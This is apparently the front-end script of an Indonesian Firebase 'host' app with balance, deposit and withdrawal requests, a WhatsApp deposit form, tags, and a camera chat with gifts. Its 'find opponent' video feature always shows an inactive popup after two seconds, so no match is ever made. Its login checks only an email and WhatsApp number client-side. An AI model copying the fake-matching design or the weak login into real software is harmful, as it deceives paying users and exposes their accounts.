


<!-- POPUP CHAT -->
<div id="chatPopup" style="
  position:fixed; 
  top:0;
  left:0;
  width:100%; 
  height:100%;
  background:#fff;
  display:none;
  align-items:center;
  justify-content:center;
  z-index:9999;
  font-family:sans-serif;
">
  <div style="
    max-width:40%;
    text-align:center;
    font-size:16px;
    color:#333;
    background:#f9f9f9;
    padding:20px;
    border-radius:10px;
  ">
    <!-- Gambar di atas teks -->
    <img src="cert_failed_wrong_avatar.png" alt="Warning" style="width:60px; height:60px; margin-bottom:10px;">
    
    <div>
      Anda belum memenuhi syarat untuk memulai percakapan!
    </div>
  </div>
</div>

  </div>
</div>

























<script type="module">
import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
import { 
  getFirestore, collection, query, where, getDocs, addDoc,
  doc,updateDoc, getDoc, onSnapshot, arrayUnion , Timestamp, orderBy
} from "https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore.js";


// ---------- FIREBASE CONFIG ----------
const firebaseConfig = {
  apiKey: "AIzaSy....",
  authDomain: "users-96dc5.firebaseapp.com",
  projectId: "users-96dc5",
  storageBucket: "users-96dc5.appspot.com",
  messagingSenderId: "483322415863",
  appId: "1:483322415863:web:xxxxxx"
};

const app = initializeApp(firebaseConfig);
const db = getFirestore(app);











const btnAkunUangTunai = document.getElementById("btnAkunUangTunai");
const bankPopup = document.getElementById("bankPopup");
const closeBankPopup = document.getElementById("closeBankPopup");


btnAkunUangTunai.addEventListener("click", async () => {
  if (!currentUser) return;

  try {
    const userRef = doc(db, "pendaftaran", currentUser.uid);
    const snap = await getDoc(userRef);

    if (snap.exists()) {
      const data = snap.data();

      // isi data rekening
      document.getElementById("viewBank").textContent = data.bank || "-";
      document.getElementById("viewNamaRek").textContent = data.namaRek || "-";
      document.getElementById("viewNoRek").textContent = data.noRek || "-";
      document.getElementById("viewEmail").innerText = data.email || "-";
      document.getElementById("viewNama").innerText = data.nama || "-";
      document.getElementById("umurText").innerText = data.umur || "-";

      // 🔥 render tag
// 🔥 render tag
const viewTags = document.getElementById("viewTags");
viewTags.innerHTML = ""; // reset isi

if (Array.isArray(data.tags) && data.tags.length > 0) {
  data.tags.forEach((tag, index) => {
    // wrapper tag
    const tagWrapper = document.createElement("div");
    tagWrapper.style.cssText = `
      display:flex;
      align-items:center;
      gap:6px;
      padding:6px 10px;
      background:#e8f0fe;
      border-radius:20px;
      font-size:13px;
      color:#333;
      white-space:nowrap;
    `;

    // teks tag
    const tagText = document.createElement("span");
    tagText.textContent = "#" + tag;

    // tombol X
    const closeBtn = document.createElement("span");
    closeBtn.textContent = "×";
    closeBtn.style.cssText = `
      cursor:pointer;
      font-weight:bold;
      color:#ff4444;
      margin-left:4px;
    `;

    // event klik hapus
    closeBtn.addEventListener("click", async () => {
      if (!currentUser) return;

      try {
        const userRef = doc(db, "pendaftaran", currentUser.uid);
        // buat array baru tanpa tag ini
        const newTags = data.tags.filter((t, i) => i !== index);

        await updateDoc(userRef, { tags: newTags });

        // hapus dari tampilan langsung
        tagWrapper.remove();

        Swal.fire({
          icon: "success",
          text: `Tag ${tag} berhasil dihapus!`,
          timer: 1500,
          showConfirmButton: false
        });
      } catch (err) {
        console.error("Gagal hapus tag:", err);
        Swal.fire({ icon: "error", text: "Gagal hapus tag!" });
      }
    });

    tagWrapper.appendChild(tagText);
    tagWrapper.appendChild(closeBtn);
    viewTags.appendChild(tagWrapper);
  });
} else {
  viewTags.innerHTML = `<span style="color:#888; font-size:13px;">Tidak ada tag</span>`;
}



 // 🚫 cek limit
    if (data.tags && data.tags.length >= 4) {
      addTagBtn.disabled = true;
      addTagBtn.style.opacity = "0.5";
      addTagBtn.style.cursor = "not-allowed";
      tagLimitInfo.textContent = "Batas maksimal 4 tag sudah tercapai";
    } else {
      addTagBtn.disabled = false;
      addTagBtn.style.opacity = "1";
      addTagBtn.style.cursor = "pointer";
      tagLimitInfo.textContent = "";
    }













    } else {
      Swal.fire({ icon: "warning", text: "Data rekening tidak ditemukan!" });
    }

    bankPopup.style.display = "flex";  

  } catch (err) {
    console.error("Error ambil data bank:", err);
    Swal.fire({ icon: "error", text: "Gagal ambil data rekening!" });
  }
});



closeBankPopup.addEventListener("click", () => {
  bankPopup.style.display = "none";
});

// Ambil elemen
 const fotoInput = document.getElementById("fotoInput");
  const viewFoto = document.getElementById("viewFoto");

  // Saat pilih foto
  fotoInput.addEventListener("change", function() {
    const file = this.files[0];
    if (!file) return;

    const reader = new FileReader();
    reader.onload = function(e) {
      const fotoBase64 = e.target.result;

      // tampilkan ke img
      viewFoto.src = fotoBase64;

      // simpan ke localStorage
      localStorage.setItem("userFoto", fotoBase64);
    };
    reader.readAsDataURL(file);
  });

  // Load ulang dari localStorage saat buka halaman
  window.addEventListener("load", () => {
    const savedFoto = localStorage.getItem("userFoto");
    if (savedFoto) {
      viewFoto.src = savedFoto;
    }
  });


// ---------- STATE ----------
let currentUser = null;
let unsubscribeSaldo = null;
let unsubscribeHistory = null;
let unsubscribeStatus = null;
let unsubscribeTagihan = null; // 🔹 tambahkan ini


// ---------- ELEMENTS ----------
const saldoHostEl   = document.getElementById("saldoHost");
const loginCard     = document.getElementById("loginCard");
const actionCard    = document.getElementById("actionCard");
const btnLogin      = document.getElementById("btnLogin");
const btnLogout     = document.getElementById("btnLogout");
const btnKirim      = document.getElementById("btnKirim");
const offlineBtn    = document.getElementById("offlineBtn");
const offlineBtn2 = document.getElementById("offlineBtn2");
const historyPopup  = document.getElementById("historyPopup");
const closePopup    = document.getElementById("closePopup");
const historyHeader = document.getElementById("historyHeader");
const historyTotal  = document.getElementById("historyTotal");
const txList        = document.getElementById("txList");
const nomErr        = document.getElementById("nomErr");
const gearBtn = document.querySelector('img[alt="leeeogo"]'); 
const editPopup = document.getElementById("editPopup");
const closeEditPopup = document.getElementById("closeEditPopup");
const editForm = document.getElementById("editForm");
const tagInput = document.getElementById("tagInput");
const tagList  = document.getElementById("tagList");
const addTagBtn = document.getElementById("addTagBtn");




// Tambah Tag pakai tombol
addTagBtn.addEventListener("click", async () => {
  const value = tagInput.value.trim();
  if (value !== "" && currentUser) {
    const newTag = value.startsWith("#") ? value : "#" + value;

    // 1. Tambah ke UI
    const tagDiv = document.createElement("div");
    tagDiv.textContent = newTag;
    tagDiv.style.cssText = `
      padding:6px 10px; 
      background:#e8f0fe; 
      border-radius:20px; 
      font-size:13px; 
      text-align:center; 
      color:#333;
    `;
    tagList.appendChild(tagDiv);

    // 2. Simpan ke Firestore
    try {
      const userRef = doc(db, "pendaftaran", currentUser.uid);
      await updateDoc(userRef, {
        tags: arrayUnion(newTag)
      });
      console.log("✅ Tag tersimpan:", newTag);
    } catch (err) {
      console.error("🔥 Error simpan tag:", err);
    }

    tagInput.value = "";
  }
});








// ---------- HELPER ----------
function formatRpShort(n) {
  if (!n && n !== 0) return "Rp0";
  const abs = Math.abs(n);
  if (abs >= 1_000_000_000) return "Rp " + (n / 1_000_000_000).toFixed(2) + "B";
  if (abs >= 1_000_000) return "Rp " + (n / 1_000_000).toFixed(2) + "JT";
  if (abs >= 1000) return "Rp " + (n / 1000).toFixed(2) + "K";
  return "Rp " + n.toLocaleString("id-ID");
}

function formatDate(ts) {
  if (!ts) return "-";
  let d = ts.toDate ? ts.toDate() : new Date(ts);
  return d.toLocaleString("id-ID", { dateStyle: "medium", timeStyle: "short" });
}








window.addEventListener("DOMContentLoaded", async () => {
  // Default: hanya tampilkan login
  loginCard.style.display = "block";
  actionCard.style.display = "none";
  document.getElementById("menuList").style.display = "none";
  if (bankPopup) bankPopup.style.display = "none";

  const saved = localStorage.getItem("currentUser");
  const savedStatus = localStorage.getItem("statusAkun"); // ambil status terakhir

  if (saved && savedStatus === "active") {
    currentUser = JSON.parse(saved);
    console.log("Restore user:", currentUser);

    loginCard.style.display = "none";
    actionCard.style.display = "block";
     loginOverlay.style.display = "none"; 
    document.getElementById("menuList").style.display = "block";

    // 🔹 tampilkan saldo dari cache dulu biar tidak kosong
    const saldoCache = localStorage.getItem("saldoUser");
    if (saldoCache !== null) {
      const saldoText = "Rp " + Number(saldoCache).toLocaleString("id-ID");
      if (saldoHostEl) saldoHostEl.innerText = saldoText;

      const saldoPopupEl = document.getElementById("saldoHostPopup");
      if (saldoPopupEl) saldoPopupEl.innerText = saldoText;

      const saldoPopupEl3 = document.getElementById("saldoHostPopup3");
      if (saldoPopupEl3) saldoPopupEl3.innerText = saldoText;
    }

    // 🔥 jalankan ulang listener realtime
    listenSaldo(currentUser.uid);
    listenTagihan(currentUser.uid);
    listenUserStatus(currentUser.uid);
      // 🔥 update last active saat user masuk ke dashboard
  updateLastActive(currentUser.uid);

  } else {
    // Kalau belum login atau status bukan active → tampilkan login
    loginCard.style.display = "block";
    actionCard.style.display = "none";
    document.getElementById("menuList").style.display = "none";
    if (bankPopup) bankPopup.style.display = "none";

    // kalau user ada tapi status bukan active, hapus aja datanya
    if (saved && (savedStatus === "suspended" || savedStatus === "deleted")) {
      localStorage.removeItem("currentUser");
    }
  }
});



// ---------- UPDATE LAST ACTIVE ----------
async function updateLastActive(uid) {
  try {
    const userRef = doc(db, "pendaftaran", uid);
    await updateDoc(userRef, {
      lastActive: Timestamp.now()
    });
    console.log("Last active updated for:", uid);
  } catch (err) {
    console.error("Gagal update lastActive:", err);
  }
}









// ---------- LOGIN ----------
btnLogin.addEventListener("click", async () => {
  const email = document.getElementById("loginEmail").value.trim();
  const wa = document.getElementById("loginWA").value.trim();

  if (!email || !wa) {
    Swal.fire({ icon: "warning", text: "Masukan Akun Host Terlebih dahulu." });
    return;
  }

  try {
    // cari user
    const q = query(
      collection(db, "pendaftaran"),
      where("email", "==", email),
      where("wa", "==", wa)
    );

    const snap = await getDocs(q);
    if (snap.empty) {
      Swal.fire({ icon: "error", text: "Email Atau Password salah!" });
      return;
    }

    let userId = "";
    let userData = {};
    snap.forEach((d) => {
      userId = d.id;
      userData = d.data();
    });

    // set current user
    currentUser = { uid: userId, email, wa, ...userData };
    localStorage.setItem("currentUser", JSON.stringify(currentUser));

    // tampilkan dashboard
   
    loginCard.style.display = "none";
    actionCard.style.display = "block";
     loginOverlay.style.display = "none"; 
    

    // jalankan listener
    listenSaldo(userId);
    listenUserStatus(userId);
    listenTagihan(userId);

    // sukses
    Swal.fire({
      icon: "success",
      text: "Login sukses sebagai " + (userData.namarek || "Host"),
      timer: 1500,
      showConfirmButton: false,
    });


    // 🔥 update waktu terakhir aktif
    updateLastActive(userId);



  } catch (err) {
    console.error("Login error:", err);
    Swal.fire({ icon: "error", text: "Terjadi error saat login,Periksa koneksi anda!." });
  }
});



// ---------- LISTEN STATUS AKUN ----------
// ---------- LISTEN STATUS AKUN ----------
function listenUserStatus(uid) {
  if (unsubscribeStatus) unsubscribeStatus(); // hentikan listener lama

  const userRef = doc(db, "pendaftaran", uid);
  unsubscribeStatus = onSnapshot(userRef, (docSnap) => {
    if (!docSnap.exists()) return;

    const data = docSnap.data();
    const status = data.statusAkun;

    // Simpan status ke localStorage biar bisa dipakai pas reload
    localStorage.setItem("statusAkun", status);

    if (status === "suspended") {
      forceLogout(
        `
          <div style="text-align:center; line-height:1.6;">
            Akun anda di <b style="color:orange;">SUSPEND</b>, Mohon patuhi kebijakan komunitas kami.<br>
            <div style="margin-top:20px; font-weight:bold;">
              Hubungi admin untuk ajukan banding
            </div>
          </div>
        `,
        "im_banned_icon.png",
        "Suspanded Account"
      );
    } 
    else if (status === "deleted") {
      forceLogout(
        `
          <div style="text-align:center; line-height:1.6;">
            Akun anda telah di <b style="color:red;">BANNED</b> oleh pihak aplikasi.<br>
            Mohon patuhi kebijakan komunitas kami.<br><br>
            <div style="margin-top:20px; font-weight:bold;">
              Hubungi admin untuk ajukan banding
            </div>
          </div>
        `,
        "banned_icon.png",
        "Akun DIBANNED"
      );
    } 
    else if (status === "active") {
      // 🚀 jangan paksa logout lagi
      console.log("User masih aktif, tetap login.");
    }
  });
}





function listenTagihan(uid) {
  const jumlahTagihanEl = document.getElementById("jumlahTagihan");
  if (!jumlahTagihanEl) return;

  // hentikan listener lama
  if (unsubscribeTagihan) unsubscribeTagihan();

  const userRef = doc(db, "pendaftaran", uid);
  unsubscribeTagihan = onSnapshot(userRef, (docSnap) => {
    if (docSnap.exists()) {
      const data = docSnap.data();
      const jumlah = data.jumlahTagihan || 0;
      jumlahTagihanEl.textContent = "Rp " + jumlah.toLocaleString("id-ID");
    } else {
      jumlahTagihanEl.textContent = "Rp 0";
    }
  });
}



// ---------- LISTEN SALDO ----------
// ---------- LISTEN SALDO ----------
function listenSaldo(uid) {
  if (unsubscribeSaldo) unsubscribeSaldo();
  const saldoRef = doc(db, "pendaftaran", uid);

  unsubscribeSaldo = onSnapshot(saldoRef, (docSnap) => {
    if (docSnap.exists()) {
      const data = docSnap.data();
      const saldoNumber = Number(data.saldo || 0);
      const saldoText = "Rp " + saldoNumber.toLocaleString("id-ID");

      // update UI
      if (saldoHostEl) saldoHostEl.innerText = saldoText;

      const saldoPopupEl = document.getElementById("saldoHostPopup");
      if (saldoPopupEl) saldoPopupEl.innerText = saldoText;

      const saldoPopupEl3 = document.getElementById("saldoHostPopup3");
      if (saldoPopupEl3) saldoPopupEl3.innerText = saldoText;

      // 🔥 simpan ke localStorage
      localStorage.setItem("saldoUser", saldoNumber);

    } else {
      if (saldoHostEl) saldoHostEl.innerText = "Rp 0";
      const saldoPopupEl = document.getElementById("saldoHostPopup");
      if (saldoPopupEl) saldoPopupEl.innerText = "Rp 0";
      const saldoPopupEl3 = document.getElementById("saldoHostPopup3");
      if (saldoPopupEl3) saldoPopupEl3.innerText = "Rp 0";

      // reset cache
      localStorage.setItem("saldoUser", 0);
    }
  });
}



// ---------- LOGOUT PAKSA ----------
// ---------- LOGOUT PAKSA ----------
function forceLogout(pesanHTML, icon = "offline.png", title = "Pemberitahuan") {
  currentUser = null;
  localStorage.removeItem("currentUser");

  if (unsubscribeSaldo) unsubscribeSaldo();
  if (unsubscribeHistory) unsubscribeHistory();
  if (unsubscribeStatus) unsubscribeStatus();
  if (unsubscribeTagihan) unsubscribeTagihan(); // 🔹 tambahkan ini


  unsubscribeSaldo = null;
  unsubscribeHistory = null;
  unsubscribeStatus = null;
  unsubscribeTagihan = null; // 🔹 reset juga


  loginCard.style.display = "block";
  actionCard.style.display = "none";
  saldoHostEl.innerText = "Rp 0";
  const jumlahTagihanEl = document.getElementById("jumlahTagihan");
  if (jumlahTagihanEl) jumlahTagihanEl.textContent = "Rp 0";

  Swal.fire({
    title: title,
    html: pesanHTML,
    imageUrl: icon,
    imageWidth: 80,
    imageHeight: 80,
    confirmButtonText: "OK",
    width: 400,
    customClass: {
      popup: "swal-rounded",
      confirmButton: "swal-btn"
    }
  });
}








// ---------- LOGOUT ----------
btnLogout.addEventListener("click", () => {
  currentUser = null;
  localStorage.removeItem("currentUser");
  if (unsubscribeSaldo) unsubscribeSaldo();
  if (unsubscribeHistory) unsubscribeHistory();
  if (unsubscribeStatus) unsubscribeStatus();   // ⬅️ tambahin ini
  unsubscribeSaldo = null;
  unsubscribeHistory = null;
  unsubscribeStatus = null;                      // ⬅️ dan ini
  loginCard.style.display = "block";
  actionCard.style.display = "none";
  saldoHostEl.innerText = "Rp 0";
  Swal.fire({ icon: "info", text: "Berhasil logout." });
});




// ---------- SUBMIT DEPOSIT ----------
btnKirim.addEventListener("click", async () => {
  if (!currentUser) {
    Swal.fire({ icon: "warning", text: "Silakan login dahulu." });
    return;
  }

  const namaPengirim = document.getElementById("namaPengirim").value.trim();
  const bank = document.getElementById("bank").value.trim();
  const nominal = parseInt(document.getElementById("nominal").value, 10);

  if (!namaPengirim || !bank || !nominal) {
    Swal.fire({ icon: "warning", text: "Semua Form harus diisi." });
    return;
  }
  if (isNaN(nominal) || nominal < 300000) {
    nomErr.style.display = "block";
    return;
  } else {
    nomErr.style.display = "none";
  }

  try {
    // 🔹 1. Simpan dulu ke subcollection user
    const subRef = await addDoc(
      collection(db, "pendaftaran", currentUser.uid, "historydeposit"),
      {
        namaPengirim,
        bank,
        nominal,
        status: "pending",
        timestamp: Timestamp.now(),
        userEmail: currentUser.email,
        userWA: currentUser.wa,
        uid: currentUser.uid,
      }
    );

    // 🔹 2. Simpan juga ke global dengan link ke subId
    await addDoc(collection(db, "historydeposit"), {
      namaPengirim,
      bank,
      nominal,
      status: "pending",
      timestamp: Timestamp.now(),
      userEmail: currentUser.email,
      userWA: currentUser.wa,
      uid: currentUser.uid,
      subId: subRef.id,   // simpan id subcollection
    });

    document.getElementById("depositForm").reset();
    Swal.fire({
      icon: "success",
      text: "Permintaan Penarikan berhasil dikirim (status: pending).",
      timer: 1500,
      showConfirmButton: false,
    });
  } catch (err) {
    console.error("Deposit error:", err);
    Swal.fire({ icon: "error", text: "Gagal mengirim Penarikan." });
  }
});









// ---------- HISTORY POPUP ----------
function openHistoryPopup() {
  if (!currentUser) {
    Swal.fire({ icon: "warning", text: "Silakan login host untuk melihat history." });
    return;
  }

  historyPopup.style.display = "flex";
  historyPopup.setAttribute("aria-hidden", "false");

  if (unsubscribeHistory) unsubscribeHistory();

  // 🔹 Query khusus subcollection user login
  const q = query(
    collection(db, "pendaftaran", currentUser.uid, "historydeposit")
  );

  unsubscribeHistory = onSnapshot(
    q,
    (snap) => {
      let docs = [];
      let totalRp = 0;

      snap.forEach((doc) => {
        const data = doc.data();
        docs.push({ id: doc.id, ...data });
        if (data && data.nominal) totalRp += Number(data.nominal || 0);
      });

      docs.sort((a, b) => b.timestamp?.toMillis() - a.timestamp?.toMillis());

      const d = new Date();
      historyHeader.innerText = `${d.getMonth() + 1}/${d.getFullYear()}`;
      historyTotal.innerText = `Total: ${formatRpShort(totalRp)}`;

      txList.innerHTML = "";
      if (docs.length === 0) {
        txList.innerHTML = `<div style="padding:20px;text-align:center;color:#999">Belum ada riwayat.</div>`;
        return;
      }

      docs.forEach((item) => {
        const itemEl = document.createElement("div");
        itemEl.className = "tx-item";

        const left = document.createElement("div");
        left.className = "tx-left";
        const main = document.createElement("div");
        main.className = "tx-main";
        main.textContent = "Punya Uang";
        const sub = document.createElement("div");
        sub.className = "tx-sub";
        sub.textContent = formatDate(item.timestamp);

        left.appendChild(main);
        left.appendChild(sub);

        const right = document.createElement("div");
        right.style.textAlign = "right";
        const amt = document.createElement("div");
        amt.className = "tx-amount";
        amt.textContent = formatRpShort(item.nominal);

        const st = document.createElement("div");
        st.className = `status-pill ${item.status || "pending"}`;
        st.textContent = (item.status || "PENDING").toUpperCase();

        right.appendChild(amt);
        right.appendChild(st);

        itemEl.appendChild(left);
        itemEl.appendChild(right);

itemEl.addEventListener("click", () => {
  let status = (item.status || "pending").toLowerCase();
  let statusColor = "";

  if (status === "approve") statusColor = "#a8a8a8";
  else if (status === "pending") statusColor = "#c9b38c";
  else if (status === "tolak") statusColor = "#f61414";
  else statusColor = "#a7a7a7";

  const html = `
    <div class="detail-item"><strong>Nama Pengirim:</strong> ${item.namaPengirim || "-"}</div>
    <div class="detail-item"><strong>Bank:</strong> ${item.bank || "-"}</div>
    <div class="detail-item"><strong>Nominal:</strong> ${formatRpShort(item.nominal || 0)}</div>
    <div class="detail-item"><strong>Status:</strong> 
      <span style="color:${statusColor}; font-weight:bold; text-transform:uppercase;">
        ${status}
      </span>
    </div>
    <div class="detail-item"><strong>Tanggal:</strong> ${formatDate(item.timestamp)}</div>
  `;

  Swal.fire({
    title: "Detail Transaksi",
    html,
    showCloseButton: true,
    showConfirmButton: false,
    width: 400,
    customClass: {
      popup: 'swal-rounded'
    }
  });
});
        txList.appendChild(itemEl);
      });
    },
    (err) => {
      console.error("onSnapshot history error:", err);
      txList.innerHTML = `<div style="padding:20px;color:red">Gagal memuat riwayat.</div>`;
    }
  );
}


// ---------- POPUP EVENTS ----------
offlineBtn.addEventListener("click", openHistoryPopup);
offlineBtn2.addEventListener("click", openHistoryPopup); // 🔹 tambahan

closePopup.addEventListener("click", () => {
  historyPopup.style.display = "none";
  historyPopup.setAttribute("aria-hidden", "true");
  if (unsubscribeHistory) unsubscribeHistory();
  unsubscribeHistory = null;
});


window.addEventListener("keydown", (e) => {
  if (e.key === "Escape") {
    historyPopup.style.display = "none";
    if (unsubscribeHistory) unsubscribeHistory();
    unsubscribeHistory = null;
  }
});
historyPopup.addEventListener("click", (ev) => {
  if (ev.target === historyPopup) {
    historyPopup.style.display = "none";
    if (unsubscribeHistory) unsubscribeHistory();
    unsubscribeHistory = null;
  }
});













// ========================
// GLOBAL: Tutup semua popup
// ========================
function closeAllPopups() {
  const dunia = document.getElementById("duniaPopup");
  const play = document.getElementById("playPopup");
  const frozen = document.getElementById("frozenPopup");
  const inbox = document.getElementById("inboooxxxxxx"); // 🔹 tambahin


  if (dunia) dunia.style.display = "none";
  if (play) play.style.display = "none";
  if (frozen) frozen.style.display = "none";
  if (inbox) inbox.style.display = "none"; // 🔹 tambahin

}

// ========================
// NAVIGASI
// ========================
window.setActiveNav = function(el) {
  document.querySelectorAll("#bottomNav .nav-item").forEach(item => {
    item.classList.remove("active");
    

    // reset ikon ke default
    const icon = item.querySelector(".nav-icon");
    if (icon) icon.src = icon.getAttribute("data-default");
  });

  el.classList.add("active");


  // ganti ikon jadi aktif
  const activeIcon = el.querySelector(".nav-icon");
  if (activeIcon) activeIcon.src = activeIcon.getAttribute("data-active");

  // Tutup semua popup ketika pindah nav
  closeAllPopups();
};


// Default buka halaman play
document.addEventListener("DOMContentLoaded", () => {
  showPageNav("play");

  document.querySelectorAll("#bottomNav .nav-item").forEach(nav => {
    nav.addEventListener("click", () => {
      closeAllPopups();
    });
  });

  // Tombol close manual Dunia
  const closeDuniaBtn = document.getElementById("closeDuniaPopup");
  if (closeDuniaBtn) {
    closeDuniaBtn.addEventListener("click", () => closeDuniaPopup());
  }

  // Tombol close manual Play
  const closePlayBtn = document.getElementById("closePlayPopup");
  if (closePlayBtn) {
    closePlayBtn.addEventListener("click", () => closePlayPopup());
  }
});




 // 🔹 Buka popup inbox
  function openInboxxxxPopup() {
    document.getElementById("inboooxxxxxx").style.display = "block";
  }

  // 🔹 Tutup popup inbox
  function closeInboxxxxPopup() {
    document.getElementById("inboooxxxxxx").style.display = "none";
  }

  // 🔹 (Opsional) buka detail chat
  function openChatDetail(userId) {
    alert("Buka detail chat untuk: " + userId);
    // nanti di sini bisa dibuat halaman detail chat full layar juga
  }




// ========================
// DUNIA POPUP
// ========================
window.openDuniaPopup = function() {
  closeAllPopups(); // pastikan popup lain tertutup
  document.getElementById("duniaPopup").style.display = "flex";
};

window.closeDuniaPopup = function() {
  document.getElementById("duniaPopup").style.display = "none";
};

// ========================
// SANPESAN POPUP
// ========================
// ========================
// INBOOXXXXXXX POPUP
// ========================
window.openInboxxxxPopup = function() {
  closeAllPopups(); // tutup popup lain dulu
  document.getElementById("inboooxxxxxx").style.display = "flex"; // konsisten dengan popup lain
};

window.closeInboxxxxPopup = function() {
  document.getElementById("inboooxxxxxx").style.display = "none";
};





// ========================
// PLAY POPUP
// ========================
window.openPlayPopup = function() {
  closeAllPopups(); // pastikan popup lain tertutup
  document.getElementById("playPopup").style.display = "flex";
};

window.closePlayPopup = function() {
  document.getElementById("playPopup").style.display = "none";
};

// ========================
// FROZEN POPUP
// ========================
const frozenPopup = document.getElementById("frozenPopup");

if (closePopup) {
  closePopup.onclick = () => frozenPopup.style.display = "none";
}
if (frozenPopup) {
  frozenPopup.onclick = (e) => {
    if (e.target === frozenPopup) frozenPopup.style.display = "none";
  };
}



  // tutup popup via id yg kamu kasih
  document.getElementById("closePopupplik").onclick = function() {
    document.getElementById("frozenPopup").style.display = "none";
  };




























document.addEventListener("DOMContentLoaded", () => {
  const btnOpen = document.getElementById("btnBayarDepooo");
  const popup = document.getElementById("bayardepoooPopup");
  const btnClose = document.getElementById("closeBayarDepooo");
  const btnKirim = document.getElementById("btnKirimBayar");
  const form = document.getElementById("bayardepoooForm");

  // ✅ Buka popup
  btnOpen.addEventListener("click", () => {
    popup.style.display = "flex";
  });

  // ✅ Tutup popup
  btnClose.addEventListener("click", () => {
    popup.style.display = "none";
  });

  // ✅ Klik Bayar Sekarang
  btnKirim.addEventListener("click", () => {
    const bank = form.bank.value;
    const namaRekening = form.namaRekening.value;
    const namaBank = form.namaBank.value;
    const nominal = form.nominal.value;

    if (!bank || !namaRekening || !namaBank || !nominal) {
      alert("Harap isi semua Form!");
      return;
    }
    if (nominal < 500000) {
      alert("Minimal deposit Rp 500.000");
      return;
    }

    const waNumber = "6283166927107"; // ✅ Nomor CS
    const message = `Form Deposit:%0A
Bank/E-Wallet: ${bank}%0A
Nama Rekening: ${namaRekening}%0A
Nomor Rekening: ${namaBank}%0A
Nominal: Rp ${parseInt(nominal).toLocaleString("id-ID")}`;

    // ✅ Redirect ke WhatsApp
    window.open(`https://wa.me/${waNumber}?text=${message}`, "_blank");

    // ✅ Tutup popup + reset form
    popup.style.display = "none";
    form.reset();
  });
});







document.addEventListener("DOMContentLoaded", () => {
  const select = document.getElementById("bankSelect");
  const selected = select.querySelector(".select-selected");
  const items = select.querySelector(".select-items");
  const bankInput = document.getElementById("bankInput");

  selected.addEventListener("click", () => {
    items.classList.toggle("select-hide");
  });

  items.querySelectorAll("div").forEach(option => {
    option.addEventListener("click", () => {
      selected.innerHTML = option.innerHTML;
      bankInput.value = option.getAttribute("data-value");
      items.classList.add("select-hide");
    });
  });

  // Klik di luar dropdown untuk menutup
  document.addEventListener("click", (e) => {
    if (!select.contains(e.target)) {
      items.classList.add("select-hide");
    }
  });
});











const openBtn = document.getElementById("openCameraBtn");   // gambar
const openBtn2 = document.getElementById("openCameraBtn2"); // tombol Awal
const closeBtn = document.getElementById("closeCameraBtn");
const popup = document.getElementById("cameraPopup");
const video = document.getElementById("customCameraVideo");
const loading = document.getElementById("loadingOverlay");
const inactivePopup = document.getElementById("inactivePopup");
const skipBtn = document.getElementById("skipBtn");
const chatBox = document.getElementById("chatBox");
const chatInput = document.getElementById("chatInput");
const chatSendBtn = document.getElementById("chatSendBtn");
let camStream = null;

// ✅ fungsi buka kamera
async function openCamera() {
  popup.style.display = "block";
  inactivePopup.style.display = "none"; // reset popup
  loading.style.display = "block";      // tampilkan loading

  try {
    camStream = await navigator.mediaDevices.getUserMedia({ video: true });
    video.srcObject = camStream;
    video.play();

    // setelah 2 detik → pause video, sembunyikan loading, tampilkan inactivePopup
    setTimeout(() => {
      if (popup.style.display === "block") {
        video.pause();
        loading.style.display = "none";
        inactivePopup.style.display = "flex";
      }
    }, 2000);

  } catch (err) {
    alert("Gagal membuka kamera: " + err.message);
    popup.style.display = "none";
  }
}

// ✅ event listener untuk 2 tombol
if (openBtn) openBtn.addEventListener("click", openCamera);
if (openBtn2) openBtn2.addEventListener("click", openCamera);

// ✅ tombol tutup kamera
closeBtn.addEventListener("click", () => {
  if (camStream) {
    camStream.getTracks().forEach(track => track.stop());
    camStream = null;
  }
  video.srcObject = null;
  popup.style.display = "none";
});

// ✅ tombol skip (cari lawan baru)
skipBtn.addEventListener("click", () => {
  video.pause();
  loading.style.display = "block";
  inactivePopup.style.display = "none"; // reset popup

  setTimeout(() => {
    if (popup.style.display === "block") {
      video.pause();
      loading.style.display = "none";
      inactivePopup.style.display = "flex";
    }
  }, 2000);
});

// ✅ kirim pesan chat
chatSendBtn.addEventListener("click", () => {
  const msg = chatInput.value.trim();
  if (!msg) return;

  const p = document.createElement("p");
  p.textContent = msg;
  p.style.margin = "5px 0";
  p.style.textAlign = "right"; 
  p.style.color = "#4CAF50";

  chatBox.appendChild(p);
  chatBox.scrollTop = chatBox.scrollHeight;
  chatInput.value = "";
});



// ================== 🎁 GIFT FEATURE ==================
const giftBtn = document.getElementById("giftBtn");
const giftPopup = document.getElementById("giftPopup");

// buka / tutup popup gift
giftBtn.addEventListener("click", () => {
  giftPopup.style.display = (giftPopup.style.display === "block") ? "none" : "block";
});

// klik gift → animasi muncul di chat
document.querySelectorAll(".giftOption").forEach(gift => {
  gift.addEventListener("click", () => {
    giftPopup.style.display = "none"; 

    // ambil poin dari atribut
    const points = gift.dataset.points || 0;

    // clone gift buat animasi terbang
    const flyingGift = gift.cloneNode(true);
    flyingGift.classList.add("gift-flying");
    document.body.appendChild(flyingGift);

    // bikin teks poin melayang
    const floatingPoints = document.createElement("div");
    floatingPoints.textContent = `-${points}`;
    floatingPoints.classList.add("points-flying");
    document.body.appendChild(floatingPoints);

    // setelah animasi selesai
    setTimeout(() => {
      flyingGift.remove();
      floatingPoints.remove();

      // masukin ke chat
      const wrapper = document.createElement("p");
      wrapper.style.margin = "5px 0";
      wrapper.style.textAlign = "center";

      const clone = gift.cloneNode(true);
      wrapper.appendChild(clone);

      const pointSpan = document.createElement("span");
      pointSpan.textContent = ` -${points}`;
      pointSpan.style.marginLeft = "6px";
      pointSpan.style.color = "yellow";
      wrapper.appendChild(pointSpan);

      chatBox.appendChild(wrapper);
      chatBox.scrollTop = chatBox.scrollHeight;

      // gift di chat hilang setelah 10 detik
      setTimeout(() => {
        wrapper.remove();
      }, 100000);
    }, 2500);
  });
});







const container = document.getElementById('carouselContainer');
const track = document.getElementById('carouselTrack');
const items = track.querySelectorAll('.carousel-item');

let scrollPos = 0;
const speed = 0.7; // pixel per frame

function updateScale() {
    const containerRect = container.getBoundingClientRect();
    const containerCenter = containerRect.left + containerRect.width / 2;

    items.forEach(item => {
        const itemRect = item.getBoundingClientRect();
        const itemCenter = itemRect.left + itemRect.width / 2;
        const distance = Math.abs(containerCenter - itemCenter);

        const scale = Math.max(0.5, 1 - distance / 300);
        item.querySelector('img').style.transform = `scale(${scale})`;
    });
}

function autoScroll() {
    scrollPos += speed;
    if(scrollPos > track.scrollWidth - container.offsetWidth) scrollPos = 0;
